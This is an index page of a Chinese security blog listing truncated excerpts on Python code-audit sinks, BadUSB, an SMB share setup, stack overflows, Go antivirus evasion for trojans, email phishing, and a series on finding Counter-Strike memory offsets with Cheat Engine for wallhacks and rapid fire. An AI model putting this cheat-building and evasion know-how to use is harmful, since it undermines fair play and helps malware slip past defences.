两层塔一般指的是飞控和电调的组合，适用于机架空间较大的花飞机架；三层塔一般指的是飞控+电调+图传的组合，适用于机架空间比较紧凑的竞速机 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/09/22/Python/" title="代码审计笔记（Python）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/150.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="代码审计笔记（Python）"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/09/22/Python/" title="代码审计笔记（Python）">代码审计笔记（Python）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-09-22T15:58:53.000Z" title="发表于 2022-09-22 23:58:53">2022-09-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/">代码审计</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

收拾收拾下自己，发现好久没有学习了，上半年状态真的好差，之前学习也静不下心来
从比较简单的语言开始学习，看看能不能有啥好东西

命令执行
标准库危险模块
# 处理标记的都是通用的import osimport subprocessimport commands  # 仅限于python2import timeitimport platformimport sys# 直接输入shell命令,以ifconfig举例os.system(&#x27;ifconfig&#x27;)os.popen(&#x27;ifconfig&#x27;)commands.getoutput(&#x27;ifconfig&#x27;)  # 仅限于python2commands.getstatusoutput(&#x27;ifconfig&#x27;)  # 仅限于python2platform.popen(&#x27;dir&#x27;).r ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/149.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="简单的BadUSB"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/07/14/BadUSB_0x01/" title="简单的BadUSB">简单的BadUSB</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-07-14T15:58:53.000Z" title="发表于 2022-07-14 23:58:53">2022-07-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.433Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/BadUSB/">BadUSB</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%92%93%E9%B1%BC/">钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


背景知识
HID（Human InterfaceDevice，是计算机直接与人交互的设备，例如键盘、鼠标等）攻击的一种。攻击者通过将USB设备模拟成为键盘，让电脑识别成为键盘，然后进行脚本模拟按键进行攻击。
PS：和之前制作的树莓派监听类似，只是这次的更加小巧
准备工作


单片机（Arduino Leonardo）


Arduino


初始化
首先我们安装好Arduino后需要把我们的单片机连接上，然后选择端口

以及我们的开发板

需要选着好这两个参数才能上传编辑，接着我们能看到两个函数
void setup() &#123;  // put your setup code here, to run once:&#125;void loop() &#123;  // put your main code here, to run repeatedly:&#125;
setup这个函数是单片机通电后执行的内容
loop是 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/148.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(八)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/05/19/CSGO_0x08/" title="CSGO破解学习(八)">CSGO破解学习(八)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-19T15:58:53.000Z" title="发表于 2022-05-19 23:58:53">2022-05-19</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.796Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


透视
看到CS的显示模式是通过OpenGL来做到的，这个是微软官方的动态链接库

作为图形硬件的软件接口，OpenGL 的主要用途是将二维和三维对象呈现为框架缓冲区。 这些对象被描述为顶点序列，这些顶点 (定义几何对象) 或像素 (定义图像) 。 OpenGL 对此数据执行多个过程，以将其转换为像素，以在帧缓冲区中形成最终所需的图像。
以下主题演示 OpenGL 工作原理的全局视图：

基元和命令 将点、线段和多边形作为绘图的基本单位进行讨论：以及命令的处理。
OpenGL 图形控件 描述哪些图形操作 OpenGL 控件及其不控制。
执行模型 讨论用于解释 OpenGL 命令的客户端/服务器模型。
基本 OpenGL 操作提供有关 OpenGL 如何处理数据以在帧缓冲区中生成相应图像的高级说明。
OpenGL 函数名称描述 OpenGL 中使用的命名约定。

我们只需要关注两个函数

openGL32.dll -&gt; gl ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/05/12/CSGO_0x07/" title="CSGO破解学习(七)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/147.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(七)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/05/12/CSGO_0x07/" title="CSGO破解学习(七)">CSGO破解学习(七)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-05-12T15:58:53.000Z" title="发表于 2022-05-12 23:58:53">2022-05-12</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.458Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


分析游戏的结构体
首先我们拿出我们之前的基地址进行结构体分析

然后往下拉找到7C 这个位置

打开有这些结构体，我们一个一个的点开看，7C的00便宜没有什么数据，但是04偏移打开竟然看到了我们的指针

那么X坐标的真实偏移应该是cstrike.exe+11069BC+7C+04+08，而不是cstrike.exe+11069BC+88，那么我们就可以印证了上一篇的猜想
查找准心指向
我们首先新建一个未知的扫描（新建的时候需要把准心对着墙壁），然后把准心对着自己队友后选择变化了，然后移到墙上搜索变化了，往复搜索最终会得到

这些数据，然后我们在跑到敌人的位置，把准心对着敌人然后在搜索变化了

就剩下这几个值，接着我们对着另一个敌人

可以看到一个值还是2，而一个值变成了6，那么我们就根据之前搜索到的数据来判断，09E1DBD8这个是阵营，09E1DBDC是敌人编号，然后我们看之前的偏移值

和上面的偏移相差不大，所以就得到了下 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/27/CSGO_0x06/" title="CSGO破解学习(六)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/146.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(六)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/27/CSGO_0x06/" title="CSGO破解学习(六)">CSGO破解学习(六)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-27T15:58:53.000Z" title="发表于 2022-04-27 23:58:53">2022-04-27</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


获取手雷地址
首先需要找到手雷的基地址，通过买手雷，然后丢了，然后在买进行搜索

然后在基地址中筛选最终的值为0583D9F8接着找基地址，右键查看什么修改了它

可以看到这个值和我们之前的不太一样，它是ecx+eax*4+000005F8 也就是说0583D3D0+C*4+5F8，算出结果是0583D3D0+628，接着使用结构体的方式来确认数值

为什么上图的地址是18B19630而不是0583D3D0了是因为我切换了地图
猜测以及思考
通过找了这么多的数据，我们可以进行一下分析，大概可以猜测一下人物的结构体

cstrike.exe+11069BC+7c存放的是整个人物的基址
cstrike.exe+11069BC+7c+4存放的关于游戏内人物具体属性的具体地址
cstrike.exe+11069BC+7c+5F0 存放的是使用武器的地址

我们通过猜测结构体，来到具体的内存位置，对人物进行操作，然后对内存进行观察，可以 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/24/CSGO_0x05/" title="CSGO破解学习(五)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/145.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(五)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/24/CSGO_0x05/" title="CSGO破解学习(五)">CSGO破解学习(五)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-24T15:58:53.000Z" title="发表于 2022-04-24 23:58:53">2022-04-24</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前置

CSGO版本更改为v3248（对之前版本的基地址进行了修改）

获取自己和敌人坐标
首先站在平面上搜索单浮点

然后在最低点的石头上搜索增加的值

接着走到顶还是搜索增加的值

接着跳下来搜索减少的

然后乱动搜索未变动的

然后跳起来的瞬间搜索变动的值

接着一个值一个值的去测试，但是这种很大的值和0都不用管它，找那种大量一样的值，然后批量选择按空格键锁定，看下人物能不能调高，如果不行那么就表示这个值是对的，最终锁定了这个值

然后就是通过老方法找基址了

接着搜索

一下子就找到了，一个是我们的地址，一个是敌人的地址，接着浏览相关内存区域

就能找到X和Y的坐标了

然后同理找到我们和敌人共用的内存地址

然后验证下

切记要等他指针变成不是你自己地址的时候去修改他
随时下包
首先搜索未知地址然后进入到下包点

看到这个变成红绿闪烁的时候搜索变动的值，然后离开下包点

等这个变成绿色的时候再次搜索变动的，以此往复
 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/17/CSGO_0x04/" title="CSGO破解学习(四)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/144.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(四)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/17/CSGO_0x04/" title="CSGO破解学习(四)">CSGO破解学习(四)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-17T15:58:53.000Z" title="发表于 2022-04-17 23:58:53">2022-04-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.436Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


手枪连发
查找方式和之前的无后座力一样的操作，通过浏览内存地址区域（当前角色的主武器子弹地址），然后我们可以看到，开枪后按住左键只有一个地址在疯狂跳动，松开武器后直接变为了0

我们把这个地址添加到列表中，然后锁定他

可以看到手枪变成了冲锋枪，然后通过基地址一查，和冲锋枪的无后座力是同一个值，我们锁定无后座力的值查看

辨别敌我
首先添加3个机器人，然后按~键弹出控制面板，输入bot_stop 1

接着把准心对着敌人进行进行搜索未知初始值

然后把准心移开后搜索变动的值

接着乱跑乱动后搜索未变动的值

接着把准心再次放到敌人身上搜索变动的值，后重复这些动作

最终只剩下这些值以后，当我们把鼠标当道敌人身上可以看到绿色和黑色的地址中有一个值06689B2C和01A01F14都是为2，而06689B30和01A01F18显示不同的数值，接下来我们切换到自己的阵营看看

06689B2C和01A01F14的值变成了1，而066 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/15/CSGO_0x03/" title="CSGO破解学习(三)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/143.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(三)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/15/CSGO_0x03/" title="CSGO破解学习(三)">CSGO破解学习(三)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-15T15:58:53.000Z" title="发表于 2022-04-15 23:58:53">2022-04-15</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.859Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


被攻击不减速
有两种方式来搜索这个地址

编辑-&gt;热键，然后在变动的数值和未变动的数值中设置快捷键，然后通过在扫描类型中选择：未知的初始化值，然后在被攻击的时候按变动的数值快捷键，未被攻击的时候按未变动的数值快捷键，来找出值（速度巨慢）
根据C++结构体的方式来查找

我们可以看到所有当前角色的指针都是cstrike.exe+D6E63C+7C然后加上某个值，那么我们就认为它代表的是这个游戏中当前角色，所有我们使用cstrike.exe+D6E63C+7C+5E8的这个值来查找，右键浏览相关内存区域

接着查看在内存区域右键切换数据类型

最后就在攻击和被攻击的时候分别查看上面一块区域和下面一块区域的内存地址，找到想符合的值，就是这个人物结构体上下找相关的值

图中纵坐标0066C5670横坐标38位置的值可以看到我们被攻击了就变成了小于1的值，如果不被攻击就为1，我们就断定他就是被攻击的小数值，然后我们右键这个值然后把 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/04/14/SMBAnonymousAccessShare/" title="SMB匿名访问共享"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/142.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="SMB匿名访问共享"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/14/SMBAnonymousAccessShare/" title="SMB匿名访问共享">SMB匿名访问共享</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-14T15:58:53.000Z" title="发表于 2022-04-14 23:58:53">2022-04-14</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.459Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/SMB/">SMB</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！

kali
修改文件/etc/samba/smb.conf，内容如下：
[global]    map to guest = bad user    server role = standalone server    usershare allow guests = yes    idmap config * : backend = tdb    smb ports = 445[smb]    comment = Samba    path = /tmp/    guest ok = yes    read only = no    browsable = yes
然后启动服务
service smbd start service nmbd start 
然后挂在共享目录
mount -t cifs //192.168.50.28/ascotbe /tmp
然后访问的Windows需要开启这个设置


windows
启用Gue ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/04/04/CSGO_0x02/" title="CSGO破解学习(二)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/141.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(二)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/04/04/CSGO_0x02/" title="CSGO破解学习(二)">CSGO破解学习(二)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-04-04T15:58:53.000Z" title="发表于 2022-04-04 23:58:53">2022-04-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


搜索血量
在搜索血量的时候我按着之前子弹的办法来搜索，结果找不到具体的值，后面发现血量有可能是单浮点，而并不是我们看到的那个整数

然后我们购买炸弹o+4进行购买，然后炸自己（别炸死了），就按这种方式一直搜索，然后找到黑色的地址通过验证子弹的方式来验证，最终找到如下临时地址

接着按着子弹的方式去找他的基址

然后搜索这个地址可以找到四个值，使用这个方法来查找

为什么选这个地址？因为只有这个地址改变了，其他的没变
为什么要使用这个方法？因为使用了找出是什么改写了这个地址无法准确的定位到上一级的地址



可以看到值在疯狂的刷新，然后再次搜索0A167E38

依旧找到了一个疯狂刷新的值，接着找到了0AA5DADC这个值，然后继续搜索

看看我们发现了什么？和我们子弹的基址是一样的，那么我们就可以断定，这个值是我们当前角色的基址，而另一个是所有玩家的基址，最终我们得到了如下结果

然后我们添加机器人验证，可以看到所有人血量的地 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2022/03/20/CSGO_0x01/" title="CSGO破解学习(一)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/140.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="CSGO破解学习(一)"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/03/20/CSGO_0x01/" title="CSGO破解学习(一)">CSGO破解学习(一)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-03-20T15:58:53.000Z" title="发表于 2022-03-20 23:58:53">2022-03-20</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/CSGO/">CSGO</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%A0%B4%E8%A7%A3/">破解</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E5%A4%96%E6%8C%82/">外挂</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


准备工作


CSGO1.6版本

分卷1
分卷2
分卷3



Cheat Engine下载地址


搜索子弹
在正式开始前还是需要一些基本的使用知识，首先我们通过内存搜索子弹，然后基于二分法进行筛选数据

上面是我们搜索出来的数据，暂时把它定义为当前地图当前身份当前人物手持的这一把AK枪的子弹内存

为什么要这样喊呢？因为在游戏里面会有多个数据结构环环嵌套，指针一个指向一个进行套娃

我们通过：右键该内存-&gt;找出是什么改写了这个地址

然后我们点击手动添加地址把06F03960加上偏移CC，即可显示当前枪械的子弹

所以06F03960就是我们上一级的地址，我们只需要使用新的扫描来搜索

可以看到4个地址，接下来我们回到游戏，把主武器丢弃查看变化

可以看到第一个地址的值变为了00000000，那我们可以知道这个地址是当前主武器的名称，而里面的06F03960是这个武器的名称。我们尝试丢弃主武器后重新换一把枪

接下 ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2022/02/22/StackOverflow_Linux_0x00/" title="Linux栈溢出总结（0x00）"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/139.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Linux栈溢出总结（0x00）"></a></div><div class="recent-post-info"><a class="article-title" href="/2022/02/22/StackOverflow_Linux_0x00/" title="Linux栈溢出总结（0x00）">Linux栈溢出总结（0x00）</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2022-02-22T10:45:42.000Z" title="发表于 2022-02-22 18:45:42">2022-02-22</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.860Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E6%A0%88/">栈</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E6%BA%A2%E5%87%BA/">溢出</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

距离第一篇栈溢出学习文章已经过去了1年半了，今天看到一篇文章终于解决了之前的一些疑惑，也理清了很多东西，记录一下，原文地址
https://mp.weixin.qq.com/s/cmLp5aHfqy1-wYiNiqdq-Q

什么是栈
简单来说，栈 是一种 LIFO（Last In Frist Out，后进先出） 形式的数据结构。栈一般是从高地址向低地址增长，并且栈支持 push（入栈） 和 pop（出栈） 两个操作。如下图所示：

push 操作先将 栈顶（sp指针） 向下移动一个位置，然后将数据写入到新的栈顶；而 pop 操作会从 栈顶 读取数据，并且将 栈顶（sp指针） 向上移动一个位置。
例如，将 0x100 压入栈，过程如下图所示：

我们再来看看 出栈 操作，如下图所示：

栈帧
栈帧，也就是 Sack Frame，其本质就是一种栈，只是这种栈专门用于保存函数调用过程中的各种信息（参数，返回地址，本地变量等 ...</div></div></div><div class="recent-post-item"><div class="post_cover right"><a href="/2021/09/04/GoUseWindowsApi/" title="Go使用WindowsApi笔记"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/132.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="Go使用WindowsApi笔记"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/09/04/GoUseWindowsApi/" title="Go使用WindowsApi笔记">Go使用WindowsApi笔记</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-09-04T12:02:59.000Z" title="发表于 2021-09-04 20:02:59">2021-09-04</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.838Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/Golang/">Golang</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

在学Go相关的免杀，来提高木马的存活性，看到一些有意思的东西记下来

加载DLL
要在Go中加载DLL，可以使用syscall.NewLazyDLL或syscall.LoadLibrary 以及syscall.MustLoadDLL。

NewLazyDLL返回一个*LazyDLL，懒加载，只在第一次调用其函数时才加载库;
LoadLibrary是立即加载DLL库。

创建函数

syscall.NewLazyDLL

package mainimport (	&quot;syscall&quot;	&quot;unsafe&quot;)func main() &#123;	user32 := syscall.NewLazyDLL(&quot;user32.dll&quot;)	MessageBoxW := user32.NewProc(&quot;MessageBoxW&quot;)	MessageBoxW.Call ...</div></div></div><div class="recent-post-item"><div class="post_cover left"><a href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)"><img class="post_bg" src= "/img/loading.gif" data-lazy-src="https://raw.staticdn.net/Ascotbe/Image/master/BlogCover/131.jpg" onerror="this.onerror=null;this.src='/img/404.gif'" alt="关于邮件钓鱼的哪些事(二)"></a></div><div class="recent-post-info"><a class="article-title" href="/2021/08/17/Office_0x02/" title="关于邮件钓鱼的哪些事(二)">关于邮件钓鱼的哪些事(二)</a><div class="article-meta-wrap"><span class="post-meta-date"><i class="far fa-calendar-alt"></i><span class="article-meta-label">发表于</span><time class="post-meta-date-created" datetime="2021-08-17T13:45:42.000Z" title="发表于 2021-08-17 21:45:42">2021-08-17</time><span class="article-meta-separator">|</span><i class="fas fa-history"></i><span class="article-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2022-12-12T10:37:57.437Z" title="更新于 2022-12-12 18:37:57">2022-12-12</time></span><span class="article-meta tags"><span class="article-meta-separator">|</span><i class="fas fa-tag"></i><a class="article-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97/">红蓝对抗</a><span class="article-meta-link">•</span><a class="article-meta__tags" href="/tags/%E9%82%AE%E4%BB%B6%E9%92%93%E9%B1%BC/">邮件钓鱼</a></span></div><div class="content">郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，如果您不同意请关闭该页面！任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！


前言

首先需要编写一个钓鱼一键化平台，然后进入我们的正题

搭建邮件服务器
